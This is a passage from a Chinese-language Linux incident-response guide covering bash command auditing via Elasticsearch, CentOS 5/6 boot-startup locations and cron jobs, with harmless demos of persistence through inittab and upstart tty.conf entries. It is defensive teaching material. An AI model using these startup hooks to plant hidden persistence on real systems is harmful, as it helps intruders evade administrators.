&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;=&gt;&nbsp;&quot;bash_%{+YYYY.MM.dd}&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Elasticsearch 添加模板</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">curl&nbsp;-XPUT&nbsp;10.59.0.248:9200/_template/template_bash&nbsp;-d&nbsp;&#39;
{
&nbsp;&nbsp;&nbsp;&quot;template&quot;:&nbsp;&quot;bash_*&quot;,&nbsp;
&nbsp;&nbsp;&nbsp;&quot;order&quot;&nbsp;:&nbsp;10,
&nbsp;&nbsp;&nbsp;&quot;settings&quot;&nbsp;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;number_of_shards&quot;:&nbsp;5,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;number_of_replicas&quot;:&nbsp;0
&nbsp;&nbsp;&nbsp;},
&nbsp;&nbsp;&nbsp;&quot;mappings&quot;&nbsp;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&quot;_default_&quot;&nbsp;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;_all&quot;&nbsp;:&nbsp;{&quot;enabled&quot;&nbsp;:&nbsp;true,&nbsp;&quot;omit_norms&quot;&nbsp;:&nbsp;true},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;properties&quot;&nbsp;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;@timestamp&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;date&quot;&nbsp;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;host&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;keyword&quot;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;cmd&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;keyword&quot;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;user&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;keyword&quot;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;uid&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;integer&quot;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;processid&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;integer&quot;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">查看Kibana</span></p><p style="text-align: center;"><img src="http://p8.qhimg.com/t01f44b9b23f44126e7.jpg" title="t01ad62a513322bc4a7.jpg" alt="http://p2.qhimg.com/t01ad62a513322bc4a7.jpg"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;~]#&nbsp;ll&nbsp;/bin/sh
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;4&nbsp;3月&nbsp;21&nbsp;2016&nbsp;/bin/sh&nbsp;-&gt;&nbsp;bash</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">/bin/sh是软链到/bin/bash的，/bin/sh也可以审计到。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">另外禁用其他的shell：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">#&nbsp;chmod&nbsp;750&nbsp;/bin/csh
#&nbsp;chmod&nbsp;750&nbsp;/bin/tcsh
#&nbsp;chmod&nbsp;750&nbsp;/bin/dash</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0x07 开机启动</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在应急响应时，开机启动项是必查的项，下面梳理一下关于开机启动与服务相关需要排查的点。直接从init开始说。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">RHEL5、RHEL6、RHEL7的init系统分别为<strong>sysvinit、upstart、systemd</strong>。这里CentOS7暂且不表，因为生产环境绝大部分都是CentOS6，少量的CentOS5。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CentOS 5：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">init程序会读取init的配置文件/etc/inittab,并依据此文件来进行初始化工作。/etc/inittab文件主要作用是指定运行级别，执行系统初始化脚本（/etc/rc.d/rc.sysinit）,启动相应运行级别下的服务和启动终端。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@jianshe_28&nbsp;admin]#&nbsp;cat&nbsp;/etc/inittab
#
#&nbsp;inittab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;file&nbsp;describes&nbsp;how&nbsp;the&nbsp;INIT&nbsp;process&nbsp;should&nbsp;set&nbsp;up
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;system&nbsp;in&nbsp;a&nbsp;certain&nbsp;run-level.
#
#&nbsp;Author:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miquel&nbsp;van&nbsp;Smoorenburg,&nbsp;&lt;[email]miquels@drinkel.nl.mugnet.org[/email]&gt;
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modified&nbsp;for&nbsp;RHS&nbsp;Linux&nbsp;by&nbsp;Marc&nbsp;Ewing&nbsp;and&nbsp;Donnie&nbsp;Barnes
#
#&nbsp;Default&nbsp;runlevel.&nbsp;The&nbsp;runlevels&nbsp;used&nbsp;by&nbsp;RHS&nbsp;are:
#&nbsp;&nbsp;&nbsp;0&nbsp;-&nbsp;halt&nbsp;(Do&nbsp;NOT&nbsp;set&nbsp;initdefault&nbsp;to&nbsp;this)
#&nbsp;&nbsp;&nbsp;1&nbsp;-&nbsp;Single&nbsp;user&nbsp;mode
#&nbsp;&nbsp;&nbsp;2&nbsp;-&nbsp;Multiuser,&nbsp;without&nbsp;NFS&nbsp;(The&nbsp;same&nbsp;as&nbsp;3,&nbsp;if&nbsp;you&nbsp;do&nbsp;not&nbsp;have&nbsp;networking)
#&nbsp;&nbsp;&nbsp;3&nbsp;-&nbsp;Full&nbsp;multiuser&nbsp;mode
#&nbsp;&nbsp;&nbsp;4&nbsp;-&nbsp;unused
#&nbsp;&nbsp;&nbsp;5&nbsp;-&nbsp;X11
#&nbsp;&nbsp;&nbsp;6&nbsp;-&nbsp;reboot&nbsp;(Do&nbsp;NOT&nbsp;set&nbsp;initdefault&nbsp;to&nbsp;this)
#&nbsp;
id:3:initdefault:
#&nbsp;System&nbsp;initialization.
si::sysinit:/etc/rc.d/rc.sysinit
l0:0:wait:/etc/rc.d/rc&nbsp;0
l1:1:wait:/etc/rc.d/rc&nbsp;1
l2:2:wait:/etc/rc.d/rc&nbsp;2
l3:3:wait:/etc/rc.d/rc&nbsp;3
l4:4:wait:/etc/rc.d/rc&nbsp;4
l5:5:wait:/etc/rc.d/rc&nbsp;5
l6:6:wait:/etc/rc.d/rc&nbsp;6
#&nbsp;Trap&nbsp;CTRL-ALT-DELETE
ca::ctrlaltdel:/sbin/shutdown&nbsp;-t3&nbsp;-r&nbsp;now
#&nbsp;When&nbsp;our&nbsp;UPS&nbsp;tells&nbsp;us&nbsp;power&nbsp;has&nbsp;failed,&nbsp;assume&nbsp;we&nbsp;have&nbsp;a&nbsp;few&nbsp;minutes
#&nbsp;of&nbsp;power&nbsp;left.&nbsp;&nbsp;Schedule&nbsp;a&nbsp;shutdown&nbsp;for&nbsp;2&nbsp;minutes&nbsp;from&nbsp;now.
#&nbsp;This&nbsp;does,&nbsp;of&nbsp;course,&nbsp;assume&nbsp;you&nbsp;have&nbsp;powerd&nbsp;installed&nbsp;and&nbsp;your
#&nbsp;UPS&nbsp;connected&nbsp;and&nbsp;working&nbsp;correctly.&nbsp;&nbsp;
pf::powerfail:/sbin/shutdown&nbsp;-f&nbsp;-h&nbsp;+2&nbsp;&quot;Power&nbsp;Failure;&nbsp;System&nbsp;Shutting&nbsp;Down&quot;
#&nbsp;If&nbsp;power&nbsp;was&nbsp;restored&nbsp;before&nbsp;the&nbsp;shutdown&nbsp;kicked&nbsp;in,&nbsp;cancel&nbsp;it.
pr:12345:powerokwait:/sbin/shutdown&nbsp;-c&nbsp;&quot;Power&nbsp;Restored;&nbsp;Shutdown&nbsp;Cancelled&quot;
#&nbsp;Run&nbsp;gettys&nbsp;in&nbsp;standard&nbsp;runlevels
1:2345:respawn:/sbin/mingetty&nbsp;tty1
2:2345:respawn:/sbin/mingetty&nbsp;tty2
3:2345:respawn:/sbin/mingetty&nbsp;tty3
4:2345:respawn:/sbin/mingetty&nbsp;tty4
5:2345:respawn:/sbin/mingetty&nbsp;tty5
6:2345:respawn:/sbin/mingetty&nbsp;tty6
#&nbsp;Run&nbsp;xdm&nbsp;in&nbsp;runlevel&nbsp;5
x:5:respawn:/etc/X11/prefdm&nbsp;-nodaemon
inittab文件中的值都是如下格式：
&gt;&nbsp;id:runlevel:action:process</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">id：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">id是指入口标识符，他是个字符串，对于getty、mingetty等，需求id和tty的编号相同，否则getty将不能正常工作。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">runlevel：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指定runlevel的级别。能指定多个runlevel级别，也能不为runlevel字段指定特定的值。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行级别决定了系统启动的绝大部分行为和目的。这个级别从0到6，具有不同的功能。不同的运行级定义如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"># 0 - 停机（千万别把initdefault设置为0，否则系统永远无法启动）</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"># 1 - 单用户模式</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"># 2 - 多用户，没有 NFS</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"># 3 - 完全多用户模式(标准的运行级)</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"># 4 - 系统保留的</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"># 5 - X11 （x window)</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"># 6 - 重新启动</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">action：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">定义了该进程应该运行在何种状态下，其中action常用的种类有：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">wait：切换至某级别运行一次process</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">respawn：此process终止的话，就重新启动之</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">initdefault：设置默认运行级别的，process省略</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">sysinit：设定系统初始化方式，此处一般指定为：/etc/rc.d/rc.sysinit</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">process：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">包含init执行的进程</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面看一下具体的配置</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&gt; id:3:initdefault:</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">设置runlevel</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&gt; si::sysinit:/etc/rc.d/rc.sysinit</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行了/etc/rc.d/rc.sysinit，一个shell脚本，他主要是完成一些系统初始化的工作，例如激活交换分区，检查磁盘，加载硬件模块及其他一些需要优先执行任务。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">l0:0:wait:/etc/rc.d/rc&nbsp;0
l1:1:wait:/etc/rc.d/rc&nbsp;1
l2:2:wait:/etc/rc.d/rc&nbsp;2
l3:3:wait:/etc/rc.d/rc&nbsp;3
l4:4:wait:/etc/rc.d/rc&nbsp;4
l5:5:wait:/etc/rc.d/rc&nbsp;5
l6:6:wait:/etc/rc.d/rc&nbsp;6</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">/etc/rc.d/rc是个shell脚本，接受runlevel参数，去执行该runlevel目录下的所有的rc启动脚本。以启动级别为3为例，/etc/rc.d/rc3.d/其实都是一些链接文件，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。而这些rc启动脚本有着类似的用法，他们一般能接受start、stop、restart、status等参数。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;init.d]#&nbsp;ll&nbsp;/etc/rc.d/rc3.d/
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;16&nbsp;Jul&nbsp;13&nbsp;15:04&nbsp;K01smartd&nbsp;-&gt;&nbsp;../init.d/smartd
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;16&nbsp;Jul&nbsp;13&nbsp;15:05&nbsp;S11auditd&nbsp;-&gt;&nbsp;../init.d/auditd
.....</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">凡是以Kxx开头的，都以stop为参数来调用；凡是以Sxx开头的，都以start为参数来调用。xx是数字、表示的是启动顺序，按xx从小到大来执行。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们来用chkconfig修改一下试试</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;rc3.d]#&nbsp;ll&nbsp;|&nbsp;grep&nbsp;audit
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;16&nbsp;Jul&nbsp;13&nbsp;15:05&nbsp;S11auditd&nbsp;-&gt;&nbsp;../init.d/auditd
[root@localhost&nbsp;rc3.d]#&nbsp;chkconfig&nbsp;auditd&nbsp;off&nbsp;--level&nbsp;3
[root@localhost&nbsp;rc3.d]#&nbsp;ll&nbsp;|&nbsp;grep&nbsp;audit
lrwxrwxrwx&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;16&nbsp;Jul&nbsp;20&nbsp;14:00&nbsp;K88auditd&nbsp;-&gt;&nbsp;../init.d/auditd</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">另外说明一下应急响应中我们都会检查/etc/rc.local，其实也是在rcN.d中。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">/etc/rc.local是软链到了/etc/rc.d/rc.local</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;init.d]#&nbsp;ll&nbsp;/etc/rc.local
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;13&nbsp;Jul&nbsp;13&nbsp;15:03&nbsp;/etc/rc.local&nbsp;-&gt;&nbsp;rc.d/rc.local</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Redhat中的运行模式2、3、5都把/etc/rc.d/rc.local做为初始化脚本中的最后一个</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;rc3.d]#&nbsp;ll&nbsp;/etc/rc.d/rc3.d/S99local&nbsp;
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;11&nbsp;Jul&nbsp;13&nbsp;15:03&nbsp;/etc/rc.d/rc3.d/S99local&nbsp;-&gt;&nbsp;../rc.local
1:2345:respawn:/sbin/mingetty&nbsp;tty1
2:2345:respawn:/sbin/mingetty&nbsp;tty2
3:2345:respawn:/sbin/mingetty&nbsp;tty3
4:2345:respawn:/sbin/mingetty&nbsp;tty4
5:2345:respawn:/sbin/mingetty&nbsp;tty5
6:2345:respawn:/sbin/mingetty&nbsp;tty6</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">init接下来会打开6个终端，以便用户登录系统。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总结一下，针对CentOS5系统，需要排查的点：</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）/etc/inittab</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该文件是可以运行process的，这里我们添加一行</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;0:235:once:/bin/vinc</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">内容如下</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;~]#&nbsp;cat&nbsp;/bin/vinc&nbsp;
#!/bin/bash
cat&nbsp;/etc/issue&nbsp;&gt;&nbsp;/tmp/version</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">重启</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;~]#&nbsp;cat&nbsp;/tmp/version&nbsp;
CentOS&nbsp;release&nbsp;5.5&nbsp;(Final)
Kernel&nbsp;\r&nbsp;on&nbsp;an&nbsp;\m</pre><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2）/etc/rc.d/rc.sysinit</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在最后插入一行/bin/vinc</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;~]#&nbsp;ll&nbsp;/tmp/version&nbsp;
-rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;47&nbsp;11-05&nbsp;10:10&nbsp;/tmp/version
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">CentOS 6：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">init会读取配置文件/etc/inittab 和 /etc/init/*.conf。先看一下/etc/inittab</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@server120&nbsp;src]#&nbsp;cat&nbsp;/etc/inittab
#&nbsp;inittab&nbsp;is&nbsp;only&nbsp;used&nbsp;by&nbsp;upstart&nbsp;for&nbsp;the&nbsp;default&nbsp;runlevel.
#
#&nbsp;ADDING&nbsp;OTHER&nbsp;CONFIGURATION&nbsp;HERE&nbsp;WILL&nbsp;HAVE&nbsp;NO&nbsp;EFFECT&nbsp;ON&nbsp;YOUR&nbsp;SYSTEM.
#
#&nbsp;System&nbsp;initialization&nbsp;is&nbsp;started&nbsp;by&nbsp;/etc/init/rcS.conf
#
#&nbsp;Individual&nbsp;runlevels&nbsp;are&nbsp;started&nbsp;by&nbsp;/etc/init/rc.conf
#
#&nbsp;Ctrl-Alt-Delete&nbsp;is&nbsp;handled&nbsp;by&nbsp;/etc/init/control-alt-delete.conf
#
#&nbsp;Terminal&nbsp;gettys&nbsp;are&nbsp;handled&nbsp;by&nbsp;/etc/init/tty.conf&nbsp;and&nbsp;/etc/init/serial.conf,
#&nbsp;with&nbsp;configuration&nbsp;in&nbsp;/etc/sysconfig/init.
#
#&nbsp;For&nbsp;information&nbsp;on&nbsp;how&nbsp;to&nbsp;write&nbsp;upstart&nbsp;event&nbsp;handlers,&nbsp;or&nbsp;how
#&nbsp;upstart&nbsp;works,&nbsp;see&nbsp;init(5),&nbsp;init(8),&nbsp;and&nbsp;initctl(8).
#
#&nbsp;Default&nbsp;runlevel.&nbsp;The&nbsp;runlevels&nbsp;used&nbsp;are:
#&nbsp;&nbsp;&nbsp;0&nbsp;-&nbsp;halt&nbsp;(Do&nbsp;NOT&nbsp;set&nbsp;initdefault&nbsp;to&nbsp;this)
#&nbsp;&nbsp;&nbsp;1&nbsp;-&nbsp;Single&nbsp;user&nbsp;mode
#&nbsp;&nbsp;&nbsp;2&nbsp;-&nbsp;Multiuser,&nbsp;without&nbsp;NFS&nbsp;(The&nbsp;same&nbsp;as&nbsp;3,&nbsp;if&nbsp;you&nbsp;do&nbsp;not&nbsp;have&nbsp;networking)
#&nbsp;&nbsp;&nbsp;3&nbsp;-&nbsp;Full&nbsp;multiuser&nbsp;mode
#&nbsp;&nbsp;&nbsp;4&nbsp;-&nbsp;unused
#&nbsp;&nbsp;&nbsp;5&nbsp;-&nbsp;X11
#&nbsp;&nbsp;&nbsp;6&nbsp;-&nbsp;reboot&nbsp;(Do&nbsp;NOT&nbsp;set&nbsp;initdefault&nbsp;to&nbsp;this)
#&nbsp;
id:3:initdefault:</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过注释可以看到，upstart只使用inittab读取默认的runlevel。添加其他的配置都不会生效，其他的配置都移动到了/etc/init/*.conf下。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">系统初始化/etc/init/rcS.conf</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对应runlevel的服务启动/etc/init/rc.conf</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">终端配置/etc/init/tty.conf</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">....</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总结一下，针对CentOS6系统，需要排查的点：</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）/etc/init/*.conf</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">vim tty.conf，添加一行</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;exec&nbsp;/bin/vinc</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">内容如下:</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincenthostname&nbsp;init]#&nbsp;cat&nbsp;/bin/vinc&nbsp;
#!/bin/bash
touch&nbsp;/tmp/vinc</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">重启</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincenthostname&nbsp;~]#&nbsp;ll&nbsp;/tmp/vinc
-rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;0&nbsp;6月&nbsp;&nbsp;22&nbsp;15:07&nbsp;/tmp/vinc
2）/etc/rc.d/rc.sysinit
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0x08 定时任务</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在应急响应中，最重要的一个点就是定时任务，例如Redis未授权通过持久化配置写入Crontab中。下面梳理一下定时任务相关的知识点：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一般常用的定时任务<strong>crontab -l</strong>是用户级别的，保存在<strong>/var/spool/cron/{user}</strong>，每个用户都可以通过<strong>crontab -e</strong>编辑自己的定时任务列表。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而/etc/crontab是系统级别的定时任务，只有Root账户可以修改。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">另外在应急的时候需要留意的点还有/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly等周期性执行脚本的目录。例如我想每天执行一个脚本，只需要放到/etc/cron.daily下，并且赋予执行权限即可。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那这些目录下的任务是怎么调用的？这里CentOS5和CentOS6还是有区别的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CentOS5中：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@jianshe_28&nbsp;/]#&nbsp;cat&nbsp;/etc/issue
CentOS&nbsp;release&nbsp;5.8&nbsp;(Final)
Kernel&nbsp;\r&nbsp;on&nbsp;an&nbsp;\m
[root@jianshe_28&nbsp;/]#&nbsp;cat&nbsp;/etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/
#&nbsp;run-parts
01&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.hourly
02&nbsp;4&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.daily
22&nbsp;4&nbsp;*&nbsp;*&nbsp;0&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.weekly
